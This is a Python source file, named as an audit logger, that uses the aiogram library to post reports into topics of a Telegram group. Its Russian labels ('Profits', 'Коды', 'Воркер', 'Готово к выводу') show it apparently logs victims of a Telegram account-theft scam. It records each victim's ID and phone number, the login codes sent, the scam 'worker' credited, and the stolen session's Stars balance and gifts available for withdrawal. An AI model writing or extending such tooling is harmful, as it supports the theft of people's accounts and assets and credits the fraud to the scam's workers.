# scripts/audit_logger.py

from aiogram import Bot
from typing import Dict
import json

# ===== НАСТРОЙКИ =====
LOG_CHAT_ID = -100XXXXXXXXXX  # группа с темами

TOPICS = {
    "logins": 1,     # Logs / Заходы
    "codes": 2,      # Logs / Коды
    "sessions": 3,   # Profits
    "errors": 4
}

# ===== ВСПОМОГАТЕЛЬНОЕ =====

async def _send(bot: Bot, topic: str, text: str):
    try:
        await bot.send_message(
            chat_id=LOG_CHAT_ID,
            message_thread_id=TOPICS[topic],
            text=text,
            parse_mode="HTML"
        )
    except Exception as e:
        print("AUDIT LOG ERROR:", e)

# ===== ФОРМАТТЕРЫ =====

def _login_fmt(user, worker):
    return (
        f"🚀 <b>{user.first_name}</b> (ID: <code>{user.id}</code>)\n"
        f"🧑‍💻 Воркер: <code>{worker}</code>"
    )

def _code_fmt(user, worker, phone):
    return (
        "📱 <b>Код отправлен</b>\n"
        f"☎️ {phone}\n"
        f"👤 <code>{user.id}</code>\n"
        f"🧑‍💻 Воркер: <code>{worker}</code>"
    )

def _session_fmt(user, worker, data: Dict):
    text = (
        "💎 <b>ОТЧЕТ ПО СЕССИИ</b>\n"
        f"👤 @{user.username} (<code>{user.id}</code>)\n"
        f"🧑‍💻 Worker: <code>{worker}</code>\n\n"
        f"⭐ Баланс: {data['balance']}\n"
        f"🎁 Всего подарков: {data['total']}\n"
        f"⚡ Готово к выводу: {data['ready']}\n"
        f"🔒 Заблокировано: {data['blocked']}\n\n"
        "📦 <b>Доступные:</b>\n"
    )

    for g in data.get("available", []):
        text += f"✅ {g['name']} ({g['price']}⭐)\n"

    if data.get("locked"):
        text += "\n🚫 <b>Недоступные:</b>\n"
        for g in data["locked"]:
            text += f"⏳ {g['name']} → {g['time']}\n"

    return text

# ===== ПУБЛИЧНЫЙ API =====

async def log_login(bot: Bot, user, worker):
    await _send(bot, "logins", _login_fmt(user, worker))

async def log_code(bot: Bot, user, worker, phone):
    await _send(bot, "codes", _code_fmt(user, worker, phone))

async def log_session(bot: Bot, user, worker, data: Dict):
    await _send(bot, "sessions", _session_fmt(user, worker, data))

async def log_error(bot: Bot, text: str):
    await _send(bot, "errors", f"❌ <b>Ошибка</b>\n{text}")